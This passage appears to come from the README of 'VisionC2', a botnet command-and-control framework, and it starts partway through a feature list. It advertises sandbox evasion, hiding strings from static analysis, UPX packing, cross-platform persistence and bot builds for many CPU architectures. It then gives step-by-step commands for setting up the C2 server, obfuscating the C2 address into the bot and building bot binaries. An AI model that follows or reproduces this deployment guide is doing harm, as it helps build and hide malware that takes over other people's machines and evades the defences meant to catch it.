- **Automatic Data Obfuscation**: Sensitive outputs are Base64-encoded in transit

### 🛡️ **Advanced Anti-Detection**
- **Sandbox Evasion**: Multi-stage detection of virtualized environments
- **String Obfuscation**: Critical strings are hidden from static analysis
- **Binary Protection**: UPX compression with string removal techniques
- **Persistence Layers**: Multiple survival mechanisms across platforms
- **Architecture-Agnostic**: 14+ CPU architectures supported seamlessly

### 💼 **Professional Operations**
- **SOCKS5 Proxy Integration**: Built-in reverse proxy tunneling for secure access
- **Formatted Output System**: Clean, professional command results with visual hierarchy
- **Real-Time Bot Analytics**: Live monitoring of bot health, architecture, and status
- **Team Collaboration**: Multiple operators with defined permission levels
- **Audit-Ready Logging**: Complete command history and user activity tracking

## 🏗️ Architecture Overview

VisionC2 operates on a client-server model with clear separation between administrative interfaces and bot agents:

```
┌─────────────────┐    TLS 1.3    ┌─────────────────┐
│   Admin Console │◄──────────────►│    C2 Server    │
│  (Multi-User)   │                │  (Go Backend)   │
└─────────────────┘                └─────────────────┘
                                         │ TLS 1.3
                                         ▼

## 🔧 Getting Started

### Prerequisites

```bash
# Install core dependencies
sudo apt update
sudo apt install -y golang-go upx-ucl openssl git

# Optional: Enhanced binary protection
git clone https://github.com/Syn2Much/upx-stripper
```

### Quick Deployment

```bash
# Clone and setup
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2

# Generate secure certificates
openssl genrsa -out server.key 4096
openssl req -new -x509 -sha256 -key server.key -out server.crt -days 365 \
  -subj "/C=US/O=Security Research/CN=visionc2.local"

# Configure your environment
cd cnc
# Edit main.go with your server details
go run .  # First run creates admin user
```

### Bot Deployment

```bash
cd bot
# Configure your C2 endpoint
python3 tools/obfuscate_c2.py "1.2.3.4:443"

# Build for multiple architectures
chmod +x build.sh
./build.sh
```
